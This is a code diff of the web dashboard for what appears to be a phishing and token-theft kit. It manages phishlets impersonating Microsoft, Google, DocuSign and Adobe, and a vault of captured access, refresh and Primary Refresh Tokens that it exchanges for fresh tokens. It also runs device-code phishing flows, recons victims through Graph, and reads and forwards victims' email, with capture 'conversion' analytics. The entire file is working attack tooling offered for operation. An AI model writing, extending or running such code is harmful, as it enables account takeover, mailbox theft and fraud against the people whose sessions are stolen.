-    function closeModal() {
-        document.getElementById('modal').style.display = 'none';
-    }
-    document.getElementById('modal').addEventListener('click', function(e) {
-        if (e.target === this) closeModal();
-    });
-
-    // =============================================
+    // ============================================================
     // TOKEN VAULT TAB
-    // =============================================
+    // ============================================================
     async function scanVault() {
-        showToast('🔍 Scanning logs for tokens...');
+        showToast('🔍 Scanning logs...');
         try {
-            const res = await fetch('/dash/api/vault/scan', { method: 'POST' });
-            const data = await res.json();
-            if (data.success) {
-                showToast(`✅ Found ${data.count} tokens.`);
-                loadVault();
-            }
-        } catch (e) {
-            showToast('❌ Scan failed: ' + e.message, true);
-        }
+            const data = await apiFetch('/vault/scan', { method: 'POST' });
+            if (data.success) { showToast(`✅ Found ${data.count} tokens.`); loadVault(); }
+        } catch (e) { showToast('Scan failed: '+e.message, true); }
     }
 
     async function healthCheckVault() {
         showToast('🩺 Checking token health...');
         try {
-            const res = await fetch('/dash/api/vault/healthcheck', { method: 'POST' });
-            const data = await res.json();
+            const data = await apiFetch('/vault/healthcheck', { method: 'POST' });
             if (data.success) {
-                const valid = data.results.filter(r => r.result.valid).length;
-                showToast(`✅ ${valid} valid tokens, ${data.results.length - valid} expired.`);
+                const valid = data.results.filter(r => r.status === 'valid').length;
+                showToast(`✅ ${valid} valid, ${data.results.length - valid} invalid.`);
                 loadVault();
             }
-        } catch (e) {
-            showToast('❌ Health check failed: ' + e.message, true);
-        }
+        } catch (e) { showToast('Health check failed: '+e.message, true); }
     }
 
     async function loadVault() {
         try {
-            const res = await fetch('/dash/api/vault/tokens');
-            const data = await res.json();
-            if (!data.success) return;
+            const data = await apiFetch('/vault/tokens');
             vaultTokens = data.tokens || [];
-            
-            const statsRes = await fetch('/dash/api/vault/stats');
-            const statsData = await statsRes.json();
-            if (statsData.success) {
-                const s = statsData.stats;
-                document.getElementById('vaultStats').textContent = 
-                    `📊 ${s.total} tokens · ${s.valid} valid · ${s.expired} expired · ${s.unknown} unknown`;
-            }
-            
+            const stats = await apiFetch('/vault/stats');
+            document.getElementById('vaultStats').textContent = `📊 ${stats.stats.total} tokens · ${stats.stats.access} access · ${stats.stats.refresh} refresh`;
             const tbody = document.getElementById('vaultTable');
             if (vaultTokens.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No tokens in vault. Click "Scan Logs" to extract tokens.</td></tr>`;
+                tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No tokens in vault.</td></tr>`;
                 return;
             }
             tbody.innerHTML = '';
-            vaultTokens.slice(0, 50).forEach(token => {
+            vaultTokens.slice(0, 50).forEach(t => {
                 const row = document.createElement('tr');
-                const statusClass = token.status === 'valid' ? 'badge-success' : 
-                                   token.status === 'expired' ? 'badge-danger' : 'badge-warning';
-                const statusLabel = token.status === 'valid' ? '✅ Valid' : 
-                                   token.status === 'expired' ? '❌ Expired' : '⚠️ Unknown';
-                const typeMap = {
-                    'access_token': '🔑 Access',
-                    'refresh_token': '🔄 Refresh',
-                    'id_token': '🆔 ID',
-                    'prt': '🔐 PRT',
-                    'flow_token': '🌊 Flow'
-                };
-                const typeDisplay = typeMap[token.type] || token.type;
-                const time = new Date(token.timestamp).toLocaleString();
+                const typeLabel = t.type === 'access' ? '🔑 Access' : t.type === 'refresh' ? '🔄 Refresh' : t.type === 'id' ? '🆔 ID' : '🔐 PRT';
                 row.innerHTML = `
-                    <td><span style="font-weight:500;">${token.username}</span></td>
-                    <td><span class="badge badge-info">${typeDisplay}</span></td>
-                    <td><span class="badge ${statusClass}">${statusLabel}</span></td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${token.sourceFile || 'N/A'}</td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${time}</td>
+                    <td><span class="badge badge-info">${typeLabel}</span></td>
+                    <td>${t.username || 'unknown'}</td>
+                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${t.file || 'N/A'}</td>
+                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${new Date(t.timestamp).toLocaleString()}</td>
                     <td>
-                        <button class="action-btn token" onclick="exchangeVaultToken('${token.value}')">🔄 Exchange</button>
-                        <button class="action-btn" onclick="navigator.clipboard.writeText('${token.value}')">📋 Copy</button>
+                        <button class="action-btn token" onclick="exchangeVaultToken('${t.value}')">🔄 Exchange</button>
+                        <button class="action-btn" onclick="navigator.clipboard.writeText('${t.value}')">📋 Copy</button>
                     </td>
                 `;
                 tbody.appendChild(row);
             });
-        } catch (e) {
-            console.error('Failed to load vault:', e);
-        }
+        } catch (e) { console.error('Vault load failed:', e); }
     }
 
     async function exchangeVaultToken(tokenValue) {
         if (!confirm('Exchange this token for a fresh access token?')) return;
         try {
-            const res = await fetch('/dash/api/vault/exchange', {
+            const data = await apiFetch('/vault/exchange', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ tokenValue })
             });
-            const data = await res.json();
             if (data.success) {
-                showToast(`✅ New access token obtained!`);
+                showToast('✅ New access token obtained!');
                 localStorage.setItem('evil_token', JSON.stringify(data.data));
                 window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.data.access_token}`, '_blank');
                 loadVault();
             } else {
-                showToast('❌ Exchange failed: ' + (data.error || 'Unknown error'), true);
+                showToast('Exchange failed: ' + (data.error || 'Unknown'), true);
             }
-        } catch (e) {
-            showToast('❌ Exchange error: ' + e.message, true);
-        }
+        } catch (e) { showToast('Exchange error: '+e.message, true); }
     }
 
-    // =============================================
+    // ============================================================
     // ANALYTICS TAB
-    // =============================================
+    // ============================================================
     async function loadAnalytics() {
         try {
-            const res = await fetch('/dash/api/analytics');
-            const data = await res.json();
-            if (!data.success) return;
+            const data = await apiFetch('/analytics');
             const a = data.analytics;
-            
             document.getElementById('analyticsVisits').textContent = a.visits.total;
             document.getElementById('analyticsCaptures').textContent = a.captures.total;
             document.getElementById('analyticsConversion').textContent = a.conversionRate.total + '%';
             document.getElementById('analyticsUniqueIPs').textContent = a.uniqueIPs;
-            
+
             const domainList = document.getElementById('topDomainsList');
-            if (a.topDomains && a.topDomains.length > 0) {
-                domainList.innerHTML = a.topDomains.map(d => 
-                    `<div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid rgba(255,255,255,0.03);">
-                        <span>${d.domain}</span>
-                        <span style="color:rgba(255,255,255,0.4);">${d.count} visits</span>
-                    </div>`
-                ).join('');
+            if (a.topDomains && a.topDomains.length) {
+                domainList.innerHTML = a.topDomains.map(d => `<div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.03);"><span>${d.domain}</span><span style="color:rgba(255,255,255,0.4);">${d.count}</span></div>`).join('');
             } else {
                 domainList.innerHTML = '<p style="color:rgba(255,255,255,0.3);">No domains tracked yet.</p>';
             }
-            
+
             const convDetails = document.getElementById('conversionDetails');
             convDetails.innerHTML = `
-                <div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid rgba(255,255,255,0.03);">
-                    <span>📊 Today</span>
-                    <span>${a.conversionRate.today}% (${a.captures.today}/${a.visits.today})</span>
-                </div>
-                <div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid rgba(255,255,255,0.03);">
-                    <span>📊 This Week</span>
-                    <span>${a.conversionRate.week}% (${a.captures.week}/${a.visits.week})</span>
-                </div>
-                <div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid rgba(255,255,255,0.03);">
-                    <span>📊 This Month</span>
-                    <span>${a.conversionRate.month}% (${a.captures.month}/${a.visits.month})</span>
-                </div>
-                <div style="display:flex; justify-content:space-between; padding:4px 0;">
-                    <span>📊 Total</span>
-                    <span>${a.conversionRate.total}% (${a.captures.total}/${a.visits.total})</span>
-                </div>
+                <div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.03);"><span>📊 Today</span><span>${a.conversionRate.today}% (${a.captures.today}/${a.visits.today})</span></div>
+                <div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.03);"><span>📊 This Week</span><span>${a.conversionRate.week}% (${a.captures.week}/${a.visits.week})</span></div>
+                <div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.03);"><span>📊 This Month</span><span>${a.conversionRate.month}% (${a.captures.month}/${a.visits.month})</span></div>
+                <div style="display:flex;justify-content:space-between;padding:4px 0;"><span>📊 Total</span><span>${a.conversionRate.total}% (${a.captures.total}/${a.visits.total})</span></div>
             `;
-            
+
             const ctx = document.getElementById('analyticsChart').getContext('2d');
             if (analyticsChart) analyticsChart.destroy();
             const labels = Object.keys(a.dailyCaptures || {});
@@ -1593,104 +865,376 @@
                 data: {
                     labels: labels,
                     datasets: [
-                        {
-                            label: 'Captures',
-                            data: captureData,
-                            backgroundColor: 'rgba(130, 177, 255, 0.4)',
-                            borderColor: '#82b1ff',
-                            borderWidth: 2,
-                            borderRadius: 8,
-                        },
-                        {
-                            label: 'Visits',
-                            data: visitData,
-                            backgroundColor: 'rgba(255, 215, 0, 0.2)',
-                            borderColor: '#ffd700',
-                            borderWidth: 2,
-                            borderRadius: 8,
-                        }
+                        { label: 'Captures', data: captureData, backgroundColor: 'rgba(130,177,255,0.4)', borderColor: '#82b1ff', borderWidth: 2, borderRadius: 8 },
+                        { label: 'Visits', data: visitData, backgroundColor: 'rgba(255,215,0,0.2)', borderColor: '#ffd700', borderWidth: 2, borderRadius: 8 }
                     ]
                 },
                 options: {
                     responsive: true,
                     maintainAspectRatio: false,
-                    plugins: {
-                        legend: { labels: { color: '#a0b0c0' } }
-                    },
+                    plugins: { legend: { labels: { color: '#a0b0c0' } } },
                     scales: {
                         y: { beginAtZero: true, ticks: { color: '#a0b0c0' }, grid: { color: 'rgba(255,255,255,0.05)' } },
                         x: { ticks: { color: '#a0b0c0' }, grid: { display: false } }
                     }
                 }
             });
-            
-        } catch (e) {
-            console.error('Failed to load analytics:', e);
-        }
+        } catch (e) { console.error('Analytics load failed:', e); }
     }
 
-    // =============================================
+    // ============================================================
     // PHISHLETS TAB
-    // =============================================
+    // ============================================================
     async function loadPhishlets() {
         try {
-            const res = await fetch('/dash/api/phishlets');
-            const data = await res.json();
-            if (!data.success) return;
-            const phishlets = data.phishlets;
+            const data = await apiFetch('/phishlets');
+            const phishlets = data.phishlets || {};
             const tbody = document.getElementById('phishletsTable');
-            if (!phishlets || Object.keys(phishlets).length === 0) {
+            if (Object.keys(phishlets).length === 0) {
                 tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No phishlets configured.</td></tr>`;
                 return;
             }
             tbody.innerHTML = '';
             Object.entries(phishlets).forEach(([id, p]) => {
                 const row = document.createElement('tr');
-                const iconMap = { 'microsoft': '🪟', 'google': '🔴', 'docusign': '📄', 'adobe': '🎨' };
+                const iconMap = { microsoft: '🪟', google: '🔴', docusign: '📄', adobe: '🎨' };
                 const icon = iconMap[id] || '📄';
                 row.innerHTML = `
                     <td><strong>${p.name}</strong></td>
                     <td style="font-size:20px;">${icon}</td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${p.file}</td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${p.entryPoint}</td>
+                    <td style="font-size:12px;color:rgba(255,255,255,0.4);">${p.file}</td>
+                    <td style="font-size:12px;color:rgba(255,255,255,0.4);">${p.entryPoint}</td>
                     <td><span class="badge ${p.enabled ? 'badge-success' : 'badge-danger'}">${p.enabled ? '✅ Enabled' : '❌ Disabled'}</span></td>
-                    <td>
-                        <label class="switch">
-                            <input type="checkbox" ${p.enabled ? 'checked' : ''} onchange="togglePhishlet('${id}', this.checked)">
-                            <span class="slider"></span>
-                        </label>
-                    </td>
+                    <td><label class="switch"><input type="checkbox" ${p.enabled ? 'checked' : ''} onchange="togglePhishlet('${id}', this.checked)"><span class="slider"></span></label></td>
                 `;
                 tbody.appendChild(row);
             });
-        } catch (e) {
-            console.error('Failed to load phishlets:', e);
-        }
+        } catch (e) { console.error('Phishlets load failed:', e); }
     }
 
     async function togglePhishlet(id, enabled) {
         try {
-            const res = await fetch('/dash/api/phishlets/toggle', {
+            const data = await apiFetch('/phishlets/toggle', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ id, enabled })
             });
-            const data = await res.json();
-            if (data.success) {
-                showToast(`✅ ${id} ${enabled ? 'enabled' : 'disabled'}`);
-                loadPhishlets();
+            if (data.success) { showToast(`✅ ${id} ${enabled ? 'enabled' : 'disabled'}`); loadPhishlets(); }
+        } catch (e) { showToast('Toggle failed: '+e.message, true); }
+    }
+
+    // ============================================================
+    // DEVICE CODE TAB
+    // ============================================================
+    async function requestDeviceCode() {
+        try {
+            const data = await apiFetch('/device/request', { method: 'POST' });
+            showToast(`📱 Device code: ${data.user_code} - Visit ${data.verification_uri}`);
+            await loadDeviceHistory();
+        } catch (e) { showToast('Device request failed: '+e.message, true); }
+    }
+
+    async function pollDeviceToken() {
+        const code = prompt('Enter device_code:');
+        if (!code) return;
+        try {
+            const data = await apiFetch('/device/token', {
+                method: 'POST',
+                body: JSON.stringify({ device_code: code })
+            });
+            if (data.access_token) {
+                showToast('✅ Token obtained!');
+                loadDeviceHistory();
+            } else {
+                showToast('Authorization pending...', true);
             }
-        } catch (e) {
-            showToast('❌ Failed to toggle phishlet: ' + e.message, true);
+        } catch (e) { showToast('Poll failed: '+e.message, true); }
+    }
+
+    async function loadDeviceHistory() {
+        try {
+            const data = await apiFetch('/device/history');
+            deviceFlows = data.flows || [];
+            const tbody = document.getElementById('deviceTable');
+            if (deviceFlows.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No device flows.</td></tr>`;
+                return;
+            }
+            tbody.innerHTML = '';
+            deviceFlows.slice().reverse().forEach(f => {
+                const row = document.createElement('tr');
+                const statusClass = f.status === 'approved' ? 'badge-success' : 'badge-warning';
+                row.innerHTML = `
+                    <td><span class="badge badge-info">${f.user_code}</span></td>
+                    <td style="font-size:12px;">${f.verification_uri}</td>
+                    <td><span class="badge ${statusClass}">${f.status}</span></td>
+                    <td style="font-size:12px;color:rgba(255,255,255,0.4);">${new Date(f.created).toLocaleString()}</td>
+                    <td style="font-size:12px;overflow:hidden;max-width:150px;">${f.access_token ? f.access_token.slice(0,30)+'...' : 'N/A'}</td>
+                    <td>
+                        ${f.access_token ? `<button class="action-btn" onclick="useDeviceToken('${f.session_id}')">▶ Use</button>` : ''}
+                        <button class="action-btn" onclick="navigator.clipboard.writeText('${f.device_code}')">📋 Copy</button>
+                    </td>
+                `;
+                tbody.appendChild(row);
+            });
+        } catch (e) { console.error('Device history load failed:', e); }
+    }
+
+    async function useDeviceToken(sessionId) {
+        try {
+            const data = await apiFetch('/device/use', {
+                method: 'POST',
+                body: JSON.stringify({ session_id: sessionId })
+            });
+            if (data.access_token) {
+                localStorage.setItem('evil_token', data.access_token);
+                showToast('✅ Token loaded. Use in Recon/Webmail tabs.');
+                document.getElementById('reconToken').value = data.access_token;
+                document.getElementById('webmailToken').value = data.access_token;
+            }
+        } catch (e) { showToast('Use token failed: '+e.message, true); }
+    }
+
+    // ============================================================
+    // PRT TAB
+    // ============================================================
+    async function scanPRT() {
+        showToast('🔍 Scanning for PRTs...');
+        try {
+            const data = await apiFetch('/prt/scan', { method: 'POST' });
+            if (data.success) {
+                showToast(`✅ Found ${data.count} PRTs.`);
+                loadPRTList();
+            }
+        } catch (e) { showToast('PRT scan failed: '+e.message, true); }
+    }
+
+    async function loadPRTList() {
+        try {
+            const data = await apiFetch('/prt/list');
+            prts = data.prts || [];
+            const stats = await apiFetch('/prt/stats');
+            document.getElementById('prtStats').textContent = `📊 ${stats.stats.total} PRTs · ${stats.stats.uniqueUsers} users`;
+            const tbody = document.getElementById('prtTable');
+            if (prts.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No PRTs found.</td></tr>`;
+                return;
+            }
+            tbody.innerHTML = '';
+            prts.slice().reverse().forEach(p => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${p.username || 'unknown'}</td>
+                    <td style="font-size:12px;font-family:monospace;">${p.prt ? p.prt.slice(0,30)+'...' : 'N/A'}</td>
+                    <td style="font-size:12px;color:rgba(255,255,255,0.4);">${new Date(p.timestamp).toLocaleString()}</td>
+                    <td style="font-size:12px;color:rgba(255,255,255,0.4);">${p.source || 'N/A'}</td>
+                    <td>
+                        <button class="action-btn token" onclick="exchangePRT('${p.prt}')">🔄 Exchange</button>
+                        <button class="action-btn" onclick="healthCheckPRT('${p.prt}')">🩺 Health</button>
+                        <button class="action-btn" onclick="navigator.clipboard.writeText('${p.prt}')">📋 Copy</button>
+                    </td>
+                `;
+                tbody.appendChild(row);
+            });
+        } catch (e) { console.error('PRT list load failed:', e); }
+    }
+
+    async function healthCheckPRT(prt) {
+        try {
+            const data = await apiFetch('/prt/health', {
+                method: 'POST',
+                body: JSON.stringify({ prt })
+            });
+            if (data.valid) showToast('✅ PRT is valid.');
+            else showToast('❌ PRT is invalid: ' + (data.error || ''), true);
+        } catch (e) { showToast('Health check failed: '+e.message, true); }
+    }
+
+    async function exchangePRT(prt) {
+        if (!confirm('Exchange this PRT for fresh tokens?')) return;
+        try {
+            const data = await apiFetch('/prt/exchange', {
+                method: 'POST',
+                body: JSON.stringify({ prt })
+            });
+            if (data.success) {
+                showToast('✅ Exchange successful!');
+                localStorage.setItem('evil_token', JSON.stringify(data.data));
+                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.data.access_token}`, '_blank');
+            }
+        } catch (e) { showToast('Exchange failed: '+e.message, true); }
+    }
+
+    async function healthCheckPRTAll() {
+        showToast('🩺 Checking all PRTs...');
+        try {
+            const data = await apiFetch('/prt/health-all', { method: 'POST' });
+            if (data.success) {
+                const valid = data.results.filter(r => r.valid).length;
+                showToast(`✅ ${valid} valid, ${data.results.length - valid} invalid.`);
+                loadPRTList();
+            }
+        } catch (e) { showToast('Health all failed: '+e.message, true); }
+    }
+
+    async function exchangePRTAll() {
+        if (!confirm('Exchange all PRTs for fresh tokens?')) return;
+        showToast('🔄 Exchanging all PRTs...');
+        try {
+            const data = await apiFetch('/prt/exchange-all', { method: 'POST' });
+            if (data.success) {
+                const success = data.results.filter(r => r.success).length;
+                showToast(`✅ ${success} of ${data.results.length} exchanged.`);
+                loadPRTList();
+            }
+        } catch (e) { showToast('Exchange all failed: '+e.message, true); }
+    }
+
+    // ============================================================
+    // RECON TAB
+    // ============================================================
+    async function doRecon() {
+        const token = document.getElementById('reconToken').value.trim();
+        if (!token) { showToast('Enter an access token.', true); return; }
+        showToast('🔍 Running recon...');
+        try {
+            const data = await apiFetch('/recon', {
+                method: 'POST',
+                body: JSON.stringify({ accessToken: token })
+            });
+            if (data.success) {
+                const profile = data.profile;
+                const html = `
+                    <h4>👤 User Profile</h4>
+                    <pre>${JSON.stringify(profile, null, 2)}</pre>
+                `;
+                document.getElementById('reconResult').innerHTML = html;
+                showToast('✅ Recon complete.');
+            }
+        } catch (e) { showToast('Recon failed: '+e.message, true); }
+    }
+
+    async function loadReconFromVault() {
+        const tokens = await apiFetch('/vault/tokens');
+        const accessToken = tokens.tokens?.find(t => t.type === 'access')?.value;
+        if (accessToken) {
+            document.getElementById('reconToken').value = accessToken;
+            showToast('✅ Loaded access token from vault.');
+            doRecon();
+        } else {
+            showToast('No access token in vault.', true);
         }
     }
 
-    // =============================================
+    // ============================================================
+    // WEBMAIL TAB
+    // ============================================================
+    async function loadWebmail() {
+        const token = document.getElementById('webmailToken').value.trim();
+        const folder = document.getElementById('webmailFolder').value;
+        const limit = parseInt(document.getElementById('webmailLimit').value) || 20;
+        if (!token) { showToast('Enter an access token.', true); return; }
+        showToast('📧 Loading emails...');
+        try {
+            const data = await apiFetch('/webmail/emails', {
+                method: 'POST',
+                body: JSON.stringify({ accessToken: token, folderId: folder, limit, skip: 0 })
+            });
+            if (data.success) {
+                const emails = data.emails || [];
+                const tbody = document.getElementById('webmailTable');
+                if (emails.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No emails found.</td></tr>`;
+                    return;
+                }
+                tbody.innerHTML = '';
+                emails.forEach(e => {
+                    const row = document.createElement('tr');
+                    const from = e.sender?.emailAddress?.address || e.from?.emailAddress?.address || 'Unknown';
+                    const received = new Date(e.receivedDateTime).toLocaleString();
+                    row.innerHTML = `
+                        <td><strong>${e.subject || '(no subject)'}</strong></td>
+                        <td style="font-size:13px;">${from}</td>
+                        <td style="font-size:12px;color:rgba(255,255,255,0.4);">${received}</td>
+                        <td>
+                            <button class="action-btn" onclick="viewEmail('${e.id}')">👁️ View</button>
+                            <button class="action-btn" onclick="forwardEmail('${e.id}')">↗️ Forward</button>
+                        </td>
+                    `;
+                    tbody.appendChild(row);
+                });
+                showToast(`📧 Loaded ${emails.length} emails.`);
+            }
+        } catch (e) { showToast('Webmail load failed: '+e.message, true); }
+    }
+
+    async function loadWebmailFromVault() {
+        const tokens = await apiFetch('/vault/tokens');
+        const accessToken = tokens.tokens?.find(t => t.type === 'access')?.value;
+        if (accessToken) {
+            document.getElementById('webmailToken').value = accessToken;
+            showToast('✅ Loaded access token from vault.');
+            loadWebmail();
+        } else {
+            showToast('No access token in vault.', true);
+        }
+    }
+
+    async function viewEmail(messageId) {
+        const token = document.getElementById('webmailToken').value.trim();
+        if (!token) { showToast('Enter an access token.', true); return; }
+        try {
+            const data = await apiFetch('/webmail/email', {
+                method: 'POST',
+                body: JSON.stringify({ accessToken: token, messageId })
+            });
+            if (data.success) {
+                const email = data.email;
+                const html = `
+                    <h4>📧 ${email.subject || '(no subject)'}</h4>
+                    <p><strong>From:</strong> ${email.sender?.emailAddress?.address || 'Unknown'}</p>
+                    <p><strong>To:</strong> ${email.toRecipients?.map(r => r.emailAddress.address).join(', ') || 'Unknown'}</p>
+                    <p><strong>Received:</strong> ${new Date(email.receivedDateTime).toLocaleString()}</p>
+                    <hr>
+                    <div>${email.body?.content || 'No body'}</div>
+                `;
+                openModal(`📄 ${email.subject || 'Email'}`, html);
+            }
+        } catch (e) { showToast('View email failed: '+e.message, true); }
+    }
+
+    async function forwardEmail(messageId) {
+        const token = document.getElementById('webmailToken').value.trim();
+        if (!token) { showToast('Enter an access token.', true); return; }
+        const to = prompt('Enter recipient email:');
+        if (!to) return;
+        const subject = prompt('Subject:');
+        const body = prompt('Body:');
+        try {
+            const data = await apiFetch('/webmail/send', {
+                method: 'POST',
+                body: JSON.stringify({
+                    accessToken: token,
+                    to: [to],
+                    subject: subject || 'Fwd: ...',
+                    body: body || 'Forwarded email.',
+                    forwardFromId: messageId
+                })
+            });
+            if (data.success) showToast('✅ Email forwarded.');
+        } catch (e) { showToast('Forward failed: '+e.message, true); }
+    }
+
+    // ============================================================
     // INIT
-    // =============================================
+    // ============================================================
     connectWebSocket();
     refreshLogs();
     setInterval(refreshLogs, 15000);
+    loadVault();
+    loadAnalytics();
+    loadPhishlets();
+    loadDeviceHistory();
+    loadPRTList();
 </script>
 </body>
 </html>
